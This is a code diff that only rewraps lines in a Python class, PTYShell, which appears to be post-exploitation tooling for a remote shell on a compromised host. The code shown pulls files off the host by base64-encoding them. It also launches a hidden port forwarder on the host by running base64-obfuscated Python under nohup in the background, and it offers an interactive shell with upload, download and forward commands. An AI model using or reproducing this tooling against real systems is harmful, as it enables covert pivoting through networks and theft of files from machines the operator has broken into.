@@ -19,7 +19,9 @@ class PTYShell:
         return r.get("output", "") if isinstance(r, dict) else str(r)
 
     def _detect_pty(self) -> bool:
-        r = self._run("python3 -c 'import pty; print(\"pty_ok\")' 2>/dev/null || python -c 'import pty; print(\"pty_ok\")' 2>/dev/null")
+        r = self._run(
+            "python3 -c 'import pty; print(\"pty_ok\")' 2>/dev/null || python -c 'import pty; print(\"pty_ok\")' 2>/dev/null"
+        )
         return "pty_ok" in r
 
     def upgrade(self) -> Dict:
@@ -51,7 +53,10 @@ class PTYShell:
         return result
 
     def download(self, remote_path: str) -> Optional[bytes]:
-        b64 = self._run("base64 -w0 %s 2>/dev/null || openssl base64 -A -in %s 2>/dev/null || cat %s | base64 -w0 2>/dev/null" % (remote_path, remote_path, remote_path))
+        b64 = self._run(
+            "base64 -w0 %s 2>/dev/null || openssl base64 -A -in %s 2>/dev/null || cat %s | base64 -w0 2>/dev/null"
+            % (remote_path, remote_path, remote_path)
+        )
         if b64 and len(b64) > 20:
             try:
                 return base64.b64decode(b64.strip())
@@ -89,17 +94,27 @@ class PTYShell:
             "  s.close();t.close();"
             "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
             "s.bind(('0.0.0.0',%d));s.listen(50);"
-            "while 1: threading.Thread(target=f,args=(s.accept()[0],)).start()" % (target_host, target_port, local_port)
+            "while 1: threading.Thread(target=f,args=(s.accept()[0],)).start()"
+            % (target_host, target_port, local_port)
         )
         b64 = base64.b64encode(python_code.encode()).decode()
-        cmd = "nohup python -c \"exec(__import__('base64').b64decode('%s').decode())\" > /dev/null 2>&1 &" % b64
+        cmd = (
+            "nohup python -c \"exec(__import__('base64').b64decode('%s').decode())\" > /dev/null 2>&1 &"
+            % b64
+        )
         self._run(cmd)
-        result = {"success": True, "command": cmd, "local_port": local_port,
-                   "forward_to": "%s:%d" % (target_host, target_port)}
+        result = {
+            "success": True,
+            "command": cmd,
+            "local_port": local_port,
+            "forward_to": "%s:%d" % (target_host, target_port),
+        }
         return result
 
     def interactive(self, init_cmd: str = ""):
-        print("[*] Interactive shell. Type 'exit' to quit, 'upload <local> <remote>', 'download <remote>', 'forward <lp> <th> <tp>'")
+        print(
+            "[*] Interactive shell. Type 'exit' to quit, 'upload <local> <remote>', 'download <remote>', 'forward <lp> <th> <tp>'"
+        )
         while True:
             try:
                 cmd = input("[shell@%s]$ " % self._cwd).strip()
@@ -139,7 +154,10 @@ class PTYShell:
                 parts = cmd.split()
                 if len(parts) == 4:
                     r = self.port_forward(int(parts[1]), parts[2], int(parts[3]))
-                    print("[+] Port forward: 127.0.0.1:%s -> %s:%s" % (r["local_port"], r["forward_to"], parts[3]))
+                    print(
+                        "[+] Port forward: 127.0.0.1:%s -> %s:%s"
+                        % (r["local_port"], r["forward_to"], parts[3])
+                    )
                 continue
             if cmd == "upgrade":
                 r = self.upgrade()
